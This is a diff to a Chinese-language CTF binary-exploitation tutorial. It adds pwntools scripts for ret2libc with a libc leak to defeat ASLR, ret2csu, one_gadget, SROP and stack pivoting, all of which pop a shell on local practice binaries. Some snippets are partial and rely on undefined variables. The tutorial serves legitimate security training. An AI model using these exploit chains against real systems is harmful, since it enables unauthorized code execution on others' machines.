@@ -190,7 +190,271 @@ ROPgadget --binary binary --only "pop|ret"
 
 ---
 
-### 六、经典例题
+### 六、ret2libc：绕过 NX 与 ASLR
+
+ret2libc 通过调用 libc 中的 `system("/bin/sh")` 来获取 shell，无需执行栈上的 shellcode。
+
+#### 1. 原理
+
+```
+payload = padding + system_plt + 返回地址 + 参数地址
+                     ↑            ↑           ↑
+               调用 system()    system()   "/bin/sh"
+                              执行完毕        字符串
+                              的返回地址       地址
+```
+
+32 位参数通过栈传递，64 位参数通过寄存器传递（rdi, rsi, rdx...）。
+
+#### 2. 32 位 ret2libc（无 ASLR）
+
+```python
+from pwn import *
+
+elf = ELF('./ret2libc1')
+io = process('./ret2libc1')
+
+offset = 112
+system_plt = elf.plt['system']
+binsh_addr = next(elf.search(b'/bin/sh'))
+
+payload = b'A' * offset
+payload += p32(system_plt)  # 调用 system
+payload += p32(0xdeadbeef)  # 返回地址（可以填任意值）
+payload += p32(binsh_addr)  # 参数
+
+io.sendline(payload)
+io.interactive()
+```
+
+#### 3. 64 位 ret2libc（传参 + ROP）
+
+64 位需要先用 pop rdi; ret gadget 设置 rdi 参数寄存器。
+
+```python
+from pwn import *
+
+elf = ELF('./ret2libc2')
+io = process('./ret2libc2')
+
+# 查找 gadget
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+
+offset = 120
+system_plt = elf.plt['system']
+binsh_addr = next(elf.search(b'/bin/sh'))
+ret = rop.find_gadget(['ret'])[0]  # 用于栈对齐
+
+payload = b'A' * offset
+payload += p64(ret)          # ret 对齐栈（16 字节对齐）
+payload += p64(pop_rdi)      # pop rdi; ret
+payload += p64(binsh_addr)   # rdi = "/bin/sh"
+payload += p64(system_plt)   # call system
+
+io.sendline(payload)
+io.interactive()
+```
+
+#### 4. 泄露 libc + ASLR 绕过
+
+```python
+from pwn import *
+
+elf = ELF('./ret2libc3')
+libc = ELF('./libc.so.6')  # 或 libc.so.6 远程版本
+io = process('./ret2libc3')
+
+# 第一步：泄露 puts 的 GOT 地址
+offset = 112
+pop_rdi = 0x400803  # pop rdi; ret
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = elf.symbols['main']
+
+payload = b'A' * offset
+payload += p64(pop_rdi)
+payload += p64(puts_got)    # rdi = puts@got
+payload += p64(puts_plt)    # call puts(puts@got)
+payload += p64(main_addr)   # 返回 main 再次执行
+
+io.sendline(payload)
+io.recvline()
+puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
+
+log.info(f"puts address: {hex(puts_addr)}")
+
+# 第二步：计算 libc 基址
+libc_base = puts_addr - libc.symbols['puts']
+log.info(f"libc base: {hex(libc_base)}")
+
+system_addr = libc_base + libc.symbols['system']
+binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
+
+# 第三步：第二次溢出调用 system("/bin/sh")
+payload2 = b'A' * offset
+payload2 += p64(pop_rdi)
+payload2 += p64(binsh_addr)
+payload2 += p64(system_addr)
+
+io.sendline(payload2)
+io.interactive()
+```
+
+---
+
+### 七、ret2csu：万能 gadget（64 位）
+
+当找不到 pop rdi; ret 时，可以用 __libc_csu_init 中的万能 gadget。
+
+```python
+from pwn import *
+
+elf = ELF('./binary')
+io = process('./binary')
+
+# __libc_csu_init 中的 gadget
+csu_pop = 0x40123A  # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+csu_call = 0x401220 # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
+
+offset = 120
+
+# 调用 write(1, write@got, 8) 泄露地址
+payload = b'A' * offset
+payload += p64(csu_pop)
+payload += p64(0)           # rbx = 0
+payload += p64(1)           # rbp = 1
+payload += p64(elf.got['write'])  # r15 = write@got
+payload += p64(8)           # r14 = rdx = 8
+payload += p64(elf.got['write'])  # r13 = rsi = write@got
+payload += p64(1)           # r12 = rdi = 1 (stdout)
+payload += p64(csu_call)    # call
+payload += p64(0) * 7       # 清空用过的寄存器
+payload += p64(elf.symbols['main'])
+
+io.sendline(payload)
+io.recv(8)
+write_addr = u64(io.recv(8))
+log.info(f"write: {hex(write_addr)}")
+```
+
+---
+
+### 八、one_gadget：一键 getshell
+
+在 libc 中可能存在一条直接执行 `execve("/bin/sh", NULL, NULL)` 的 gadget。
+
+```bash
+# 查找 one_gadget
+one_gadget ./libc.so.6
+
+# 输出类似：
+# 0xe3afe execve("/bin/sh", r15, r12)
+# 0xe3b01 execve("/bin/sh", r15, r13)
+# 0xe3b04 execve("/bin/sh", r15, rdx)
+```
+
+```python
+from pwn import *
+
+elf = ELF('./binary')
+libc = ELF('./libc.so.6')
+io = process('./binary')
+
+# 泄露 libc 基址（同 ret2libc）
+# ...
+
+# one_gadget 地址
+one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]
+offset = 120
+
+# 直接跳转到 one_gadget
+libc_base = puts_addr - libc.symbols['puts']
+payload = b'A' * offset
+payload += p64(libc_base + one_gadget[0])
+
+io.sendline(payload)
+io.interactive()
+```
+
+---
+
+### 九、SROP（Sigreturn-Oriented Programming）
+
+利用信号处理机制，通过 sigreturn 系统调用设置所有寄存器的值。
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+
+elf = ELF('./binary')
+io = process('./binary')
+
+# 构造 SigreturnFrame
+frame = SigreturnFrame()
+frame.rdi = next(elf.search(b'/bin/sh'))
+frame.rsi = 0
+frame.rdx = 0
+frame.rax = constants.SYS_execve  # 59
+frame.rip = libc_base + libc.symbols['syscall']  # syscall 地址
+
+# 找到 syscall; ret 和 sigreturn 的 gadget
+syscall_ret = 0x401234
+mov_rax_15 = 0x401111  # mov eax, 15; ret 或类似 gadget
+
+offset = 120
+payload = b'A' * offset
+payload += p64(mov_rax_15)  # rax = 15 (SYS_rt_sigreturn)
+payload += p64(syscall_ret)  # syscall
+payload += bytes(frame)     # 伪造的信号帧
+
+io.sendline(payload)
+io.interactive()
+```
+
+---
+
+### 十、Stack Pivoting（栈迁移）
+
+当溢出空间不足时，将栈指针迁移到可控的内存区域。
+
+```python
+from pwn import *
+
+elf = ELF('./binary')
+io = process('./binary')
+
+# 需要的 gadget
+leave_ret = 0x401111  # leave; ret
+# leave 等价于：mov rsp, rbp; pop rbp
+
+# 第一步：先泄露 stack 地址
+# ...
+
+# 第二步：用栈迁移
+bss_addr = 0x601000 + 0x800  # BSS 段可写区域
+fake_rbp = bss_addr
+
+# 构造的 payload
+# 首先在 BSS 段布置 ROP 链
+# ...
+
+# 然后在栈溢出点
+offset = 120
+payload = b'A' * offset
+payload += p64(fake_rbp)    # 覆盖 rbp 为 BSS 地址
+payload += p64(leave_ret)   # leave; ret
+# leave: rsp = fake_rbp; pop rbp（rsp 移到 BSS 区域）
+# ret: 执行 BSS 区域中的 ROP 链
+
+io.sendline(payload)
+io.interactive()
+```
+
+---
+
+### 十一、经典例题
 
 ```python
 from pwn import *
@@ -216,7 +480,7 @@ io.interactive()
 
 ---
 
-### 七、练习平台
+### 十二、练习平台
 
 - [pwnable.kr](http://pwnable.kr/)
 - [ROP Emporium](https://ropemporium.com/)
